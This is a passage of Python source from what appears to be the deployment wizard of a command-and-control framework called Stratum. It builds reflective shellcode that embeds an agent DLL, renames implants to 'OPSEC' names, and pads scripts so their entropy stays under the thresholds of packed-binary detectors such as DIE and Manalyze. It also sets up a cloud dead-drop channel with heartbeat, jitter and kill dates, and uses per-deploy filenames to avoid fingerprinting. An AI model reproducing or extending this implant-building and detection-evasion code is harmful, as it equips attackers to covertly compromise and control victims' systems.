                    if _sc_dir.exists():
                        _pe_path_str = str(_dll_path.resolve())
                        info(f"  shellcode: STRATUM_PE_PATH={_pe_path_str}  exists={_dll_path.exists()}  size={_dll_path.stat().st_size if _dll_path.exists() else 'N/A'}")
                        _sc_env = {
                            **_os_sc.environ,
                            "STRATUM_PE_PATH": _pe_path_str,
                        }
                        # Force recompile — the embedded PE changes every deployment.
                        # Delete build/, .fingerprint/, deps/shellcode*, and the
                        # final binary so Cargo cannot serve any cached artifact.
                        _sc_rel = _sc_dir / "target" / _sc_tgt / "release"
                        for _sub, _glob in [
                            ("build",        "stratum-shellcode-*"),
                            (".fingerprint", "stratum-shellcode-*"),
                            ("deps",         "shellcode*"),
                        ]:
                            _d = _sc_rel / _sub
                            if _d.exists():
                                for _item in _d.glob(_glob):
                                    _sh_sc.rmtree(_item, ignore_errors=True)
                        _sc_bin = _sc_rel / "shellcode"
                        if _sc_bin.exists():
                            _sc_bin.unlink(missing_ok=True)

                        _r = _sp.run(
                            ["cargo", "build", "--release", "--target", _sc_tgt],
                            cwd=_sc_dir, env=_sc_env,
                            capture_output=True, text=True,
                        )
                        if _r.returncode == 0:
                            _sc_out = _sc_dir / "target" / _sc_tgt / "release" / "shellcode"
                            _sc_dest = agent_dir / f"{_base}.bin"
                            if _sc_out.exists():
                                _sh_sc.copy2(_sc_out, _sc_dest)
                                info(f"  shellcode blob size: {_sc_dest.stat().st_size} bytes")
                                ok(f"{_base}.bin compiled  (x64 reflective shellcode, embeds {_base}.dll)")
                        else:
                            warn(f"  shellcode build failed: {_r.stderr.strip()[-200:]}")
                else:
                    warn(f"{_base}.bin skipped — MSVC DLL required (stub.dll must exist before shellcode build)")

    def _step_rename_agents(self, cfg: BaseConfig, agent_dir: Path) -> None:
        """Rename compiled agent artifacts to operator-supplied OPSEC names."""
        import re as _re
        def _safe_stem(s: str) -> str:
            # Strip path separators and dots to prevent path traversal / hidden files.
            # Allow alphanumerics, dash, underscore only.
            return _re.sub(r'[^A-Za-z0-9_\-]', '', s)[:64]

        win_stem   = _safe_stem(cfg.agent_name_win)   if cfg.agent_name_win   else ""
        linux_stem = _safe_stem(cfg.agent_name_linux) if cfg.agent_name_linux else ""
        if not win_stem and not linux_stem:
            return

        _EXT_WIN   = (".exe", ".dll", ".bin")
        _EXT_LINUX = (".elf", ".sh")
        renamed = []
        for f in sorted(agent_dir.iterdir()):
            if not f.is_file():
                continue
            ext      = f.suffix
            new_stem = None
            if ext in _EXT_WIN and win_stem:
                new_stem = win_stem
            elif ext in _EXT_LINUX and linux_stem:
                new_stem = linux_stem
            if new_stem:
                new_name = new_stem + ext
                dst = agent_dir / new_name
                if dst != f:
                    f.rename(dst)
                    renamed.append(f"{f.name} → {new_name}")
        if renamed:
            self._step("Agent Renaming")
            for r in renamed:
                ok(r)

    def _step_pad_scripts(self, agent_dir: Path) -> None:
        """Append low-entropy padding to generated scripts to lower overall file entropy.

        Target H ≤ 5.0 so that when the script is embedded in a PE/ELF .rdata/.rodata
        section alongside other read-only strings the section stays ≤ 5.5 b/B,
        well below the 6.5 b/B threshold used by DIE and the 7.0 b/B threshold
        used by Manalyze/pefile for per-section packed-binary detection.
        """
        self._step("Entropy balancing  (scripts → .rdata/.rodata target ≤ 5.5 b/B)")
        ext_map = {".ps1": "ps1", ".sh": "sh"}
        results = []
        for p in sorted(agent_dir.iterdir()):
            if p.suffix not in ext_map:
                continue
            H_before = _entropy(p.read_bytes())
            H_after = _pad_script_entropy(p, target=5.0, mode=ext_map[p.suffix])
            results.append((p.name, H_before, H_after))
        if not results:
            info("No scripts found")
            return
        for name, h_before, h_after in results:
            if h_after < h_before - 0.05:
                ok(f"{name}: {h_before:.2f} → {h_after:.2f} b/B  (padded)")
            else:
                info(f"{name}: {h_before:.2f} b/B  (within target)")

    def _step_entropy_table(self, agent_dir: Path) -> None:
        """Display a per-artifact Shannon entropy table after compilation."""
        artifacts = sorted(
            p for p in agent_dir.iterdir()
            if p.is_file() and p.suffix not in (".txt",)
        )
        if not artifacts:
            return

        NAME_W, SIZE_W, ENT_W, PROF_W = 38, 10, 13, 18
        top = "  ┌" + "─"*NAME_W + "┬" + "─"*SIZE_W + "┬" + "─"*ENT_W + "┬" + "─"*PROF_W + "┐"
        mid = "  ├" + "─"*NAME_W + "┼" + "─"*SIZE_W + "┼" + "─"*ENT_W + "┼" + "─"*PROF_W + "┤"
        bot = "  └" + "─"*NAME_W + "┴" + "─"*SIZE_W + "┴" + "─"*ENT_W + "┴" + "─"*PROF_W + "┘"

        _p([("", "")])
        _p([("class:cyan", top)])
        hdr = (f"  │ {'Artifact':<{NAME_W-1}}│{'Size':^{SIZE_W}}"
               f"│{'Entropy':^{ENT_W}}│{'Profile':^{PROF_W}}│")
        _p([("class:cyan", hdr)])
        _p([("class:cyan", mid)])

        for p in artifacts:
            try:
                data = p.read_bytes()
            except Exception:
                continue
            sz = len(data)
            H  = _entropy(data)

            if sz >= 1024 * 1024:
                sz_str = f"{sz / 1048576:.1f} MB"
            elif sz >= 1024:
                sz_str = f"{sz // 1024} KB"
            else:
                sz_str = f"{sz} B"

            n_blk = round(H / 8 * 10)
            bar   = "█" * n_blk + "░" * (10 - n_blk)

            if H < 5.5:
                status, vc = "ok",   "class:green"
            elif H < 7.0:
                status, vc = "ok",   "class:yellow"
            else:
                status, vc = "high", "class:red"

            name_col = f" {p.name:<{NAME_W-1}}"
            size_col = f"{sz_str:^{SIZE_W}}"
            ent_col  = f"  {H:.2f} b/B   "       # fixed 13 chars
            prof_col = f" {bar} {status:<6}"      # fixed 18 chars

            _p([
                ("class:cyan",  "  │"),
                ("class:white", name_col),
                ("class:cyan",  "│"),
                ("class:dim",   size_col),
                ("class:cyan",  "│"),
                (vc,            ent_col),
                ("class:cyan",  "│"),
                (vc,            prof_col),
                ("class:cyan",  "│"),
            ])

        _p([("class:cyan", bot)])
        _p([("", "")])

    # ── template method ────────────────────────────────────────────────────────

    def run(self, manager: SessionManager,
            project_dir: Path = Path(".")) -> Session:
        """Run the full deployment wizard and register the new session."""
        from providers import WizardError as _WizardError
        import shutil as _shutil

        project_dir = project_dir.resolve()
        cfg = self.make_config()
        self._step_n = 0
        deploy_dir: Optional[Path] = None

        try:
            self._step_check_templates()
            self.step_auth(cfg)
            self._step_configure(cfg)

            # Warn if folder_path collides with an existing session (same provider + path).
            _existing_folders = {
                s.profile.folder_path
                for s in manager.all()
                if s.profile.provider == self.PROVIDER_ID and hasattr(s.profile, "folder_path")
            }
            if cfg.folder_path in _existing_folders:
                warn(f"Folder path '{cfg.folder_path}' is already used by another {self.PROVIDER_NAME} session.")
                warn("Two agents sharing the same folder will collide on the dead-drop channel.")
                if not ask_yn("Continue anyway?", default=False):
                    raise _WizardError("Aborted — choose a unique folder path.")

            if cfg.mode in ("staged-enc", "stageless-enc"):
                self._step_generate_stub_secret(cfg)

            _deploy_base = Path("deployments")
            session_id = os.urandom(6).hex()
            try:
                while any(_deploy_base.glob(f"{self.PROVIDER_ID}_*_{session_id}")):
                    session_id = os.urandom(6).hex()
            except OSError:
                pass  # deployments/ doesn't exist yet — no collision possible

            deploy_dir = self._step_create_deploy_dir(cfg, session_id)
            agent_dir  = deploy_dir / "agent"
            keys_dir   = deploy_dir / "keys" / session_id

            # Copy shared credentials cache into deploy dir for per-session isolation.
            _dest_creds = self._creds_path(deploy_dir)
            _src_creds  = self._global_creds_file
            if _src_creds.exists() and _dest_creds != _src_creds:
                try:
                    _shutil.copy2(_src_creds, _dest_creds)
                    _dest_creds.chmod(0o600)
                except Exception as _cp_exc:
                    warn(f"Could not copy credentials to deploy dir: {_cp_exc}")

            _priv_pem, pub_pem = self._step_keygen(keys_dir, session_id, cfg,
                                                    manager._key_password)

            # Derive per-deploy cloud filenames from the pub key hash to avoid
            # static .s2l/.s2w fingerprints common to all Stratum deployments.
            _h = hashlib.sha256(pub_pem).hexdigest()
            cfg.sk_suffix  = "." + _h[34:40]
            cfg.s2l_suffix = "." + _h[22:28]
            cfg.s2w_suffix = "." + _h[28:34]

            self.step_init_channel(cfg)

            if cfg.mode == "staged-enc":
                self.step_upload_stage2(cfg, agent_dir, pub_pem)
                self._step_generate_stubs(cfg, agent_dir, pub_pem)
            elif cfg.mode == "stageless-enc":
                self.step_upload_stageless_enc(cfg, agent_dir, pub_pem)
            elif cfg.mode == "stageless-plain":
                self._step_generate_agents_plain(cfg, agent_dir, pub_pem)

            self._step_pad_scripts(agent_dir)
            self._step_compile_artifacts(cfg, agent_dir, pub_pem)
            if cfg.mode == "staged-enc":
                self.step_upload_stage2_win(cfg, agent_dir)
            self._step_rename_agents(cfg, agent_dir)
            self._step_entropy_table(agent_dir)

            # Build session profile — creds_file is relative to project root (e.g. credentials/dropbox)
            # or relative to project_dir. Path division handles both cases correctly.
            creds_rel_path = str(self._creds_path(deploy_dir))
            key_rel_path   = str(deploy_dir / "keys" / session_id / "private_key.pem")
            profile = SessionProfile(
                session_id       = session_id,
                label            = cfg.folder_path.strip("/"),
                provider         = self.PROVIDER_ID,
                creds_file       = creds_rel_path,
                private_key_file = key_rel_path,
                folder_path      = cfg.folder_path,
                input_file       = cfg.input_file,
                output_file      = cfg.output_file,
                heartbeat_file   = cfg.heartbeat_file,
                base_sleep       = cfg.base_sleep,
                jitter_percent   = cfg.jitter_percent,
                deploy_mode      = cfg.mode,
                blob_path        = cfg.blob_path_linux,
                blob_path_win    = cfg.blob_path_win,
                ip_ext           = cfg.ip_ext,
                s2_path_cloud    = cfg.s2_path_linux if cfg.mode == "staged-enc" else "",
                s2_uploaded_at   = cfg.s2_uploaded_at,
                session_key      = cfg.session_key,
                added_at         = _tz.now().isoformat(),
                kill_date        = cfg.kill_date    or "",
                window_start     = cfg.window_start or "",
                window_end       = cfg.window_end   or "",
            )

            # Instantiate transport from freshly-obtained credentials
            transport = self._make_transport(cfg)

            # Clear any stale task left on the input channel from a previous
            # deployment that shared the same cloud folder path.
            transport.upload(profile.input_path, MZ_MARKER.encode())

            # Create session, start HB monitor, register in manager.
            # From this point on, rollback is no longer safe (HB thread started).
            session = Session(profile, transport, project_dir, manager._key_password)
            _load_persist_probe(session)
            session.private_key_file   # validate key exists
            raw = transport.download(profile.output_path)
            session.baseline = raw.decode("utf-8", errors="replace").strip() if raw else MZ_MARKER
            _initial_hb_check(session)
            session._hb = HeartbeatMonitor(session)
            session._hb.start()
            manager.add(session)

        except Exception as _deploy_exc:
            import traceback as _tb
            warn(f"Deploy exception: {_deploy_exc}")
            warn(_tb.format_exc())
            if deploy_dir is not None and deploy_dir.exists():
                try:
                    _shutil.rmtree(deploy_dir)
                    warn(f"Deploy aborted — local artifacts removed: {deploy_dir}")
                except Exception as _rm_exc:
                    warn(f"Deploy aborted — could not remove {deploy_dir}: {_rm_exc}")
            if self._cloud_cleanup_paths and self._cloud_transport is not None:
                warn(f"Rolling back {len(self._cloud_cleanup_paths)} cloud artifact(s)...")
                for _cp in self._cloud_cleanup_paths:
                    try:
                        self._cloud_transport.delete(_cp)
                        warn(f"  Deleted: {_cp}")
                    except Exception as _del_exc:
                        warn(f"  Could not delete {_cp}: {_del_exc}")
            elif self._cloud_cleanup_paths:
                warn(f"NOTE: {len(self._cloud_cleanup_paths)} cloud artifact(s) may remain (no transport available for cleanup).")
            raise

        self._step_generate_docs(cfg, deploy_dir, session_id)
        self._step_summary(cfg, deploy_dir, session_id)

        return session
